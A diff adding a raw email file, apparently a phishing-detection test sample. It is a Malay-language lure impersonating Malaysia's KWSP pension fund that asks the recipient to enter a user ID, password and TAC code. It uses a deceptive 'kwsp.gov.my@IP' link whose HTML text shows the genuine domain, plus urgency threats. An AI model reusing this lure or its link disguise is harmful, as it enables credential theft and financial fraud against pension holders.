@@ -1,0 +1,46 @@
+Return-Path: <kwsp.pengeluaran2026@gmail.com>
+Received: from mx.unifi-mail.example (mx.unifi-mail.example [10.20.0.5])
+	by inbox.unifi-mail.example with LMTP; Sat, 21 Nov 2026 10:27:02 +0800
+Authentication-Results: mx.unifi-mail.example;
+	spf=pass (domain of kwsp.pengeluaran2026@gmail.com designates 209.85.128.50 as permitted sender) smtp.mailfrom=gmail.com;
+	dkim=pass header.d=gmail.com header.s=20230601;
+	dmarc=pass (p=NONE) header.from=gmail.com
+Received: from mail-wm1-f50.google.com (mail-wm1-f50.google.com [209.85.128.50])
+	by mx.unifi-mail.example (Postfix) with ESMTPS id 5B6C7D8
+	for <aina.rahman@unifi-mail.example>; Sat, 21 Nov 2026 10:26:59 +0800
+From: "KWSP Malaysia (i-Akaun)" <kwsp.pengeluaran2026@gmail.com>
+To: aina.rahman@unifi-mail.example
+Subject: Pengeluaran Akaun Fleksibel anda telah diluluskan - RM3,000
+Date: Sat, 21 Nov 2026 10:26:50 +0800
+Message-ID: <CAF8x2kq9p0Lmz@mail.gmail.com>
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="kwsp04"
+
+--kwsp04
+Content-Type: text/plain; charset=utf-8
+
+Ahli KWSP yang dihormati,
+
+Permohonan pengeluaran Akaun Fleksibel (Akaun 3) anda sebanyak RM3,000 telah diluluskan.
+Bayaran akan dikreditkan ke akaun bank anda selepas pengesahan.
+
+Sila log masuk ke i-Akaun dengan ID pengguna dan kata laluan anda, kemudian masukkan kod TAC untuk menerima bayaran:
+https://www.kwsp.gov.my@198.51.100.47/i-akaun/login
+
+Pengesahan mesti dibuat segera. Permohonan yang tidak disahkan akan ditamatkan.
+
+Kumpulan Wang Simpanan Pekerja
+
+--kwsp04
+Content-Type: text/html; charset=utf-8
+
+<html><body style="font-family:Arial,sans-serif">
+<p>Ahli KWSP yang dihormati,</p>
+<p>Permohonan pengeluaran <b>Akaun Fleksibel (Akaun 3)</b> anda sebanyak <b>RM3,000</b> telah diluluskan.
+Bayaran akan dikreditkan ke akaun bank anda selepas pengesahan.</p>
+<p>Sila log masuk ke i-Akaun dengan ID pengguna dan kata laluan anda, kemudian masukkan kod TAC untuk menerima bayaran:</p>
+<p><a href="https://www.kwsp.gov.my@198.51.100.47/i-akaun/login">https://www.kwsp.gov.my/i-akaun</a></p>
+<p>Pengesahan mesti dibuat <b>segera</b>. Permohonan yang tidak disahkan akan ditamatkan.</p>
+<p>Kumpulan Wang Simpanan Pekerja</p>
+</body></html>
+--kwsp04--
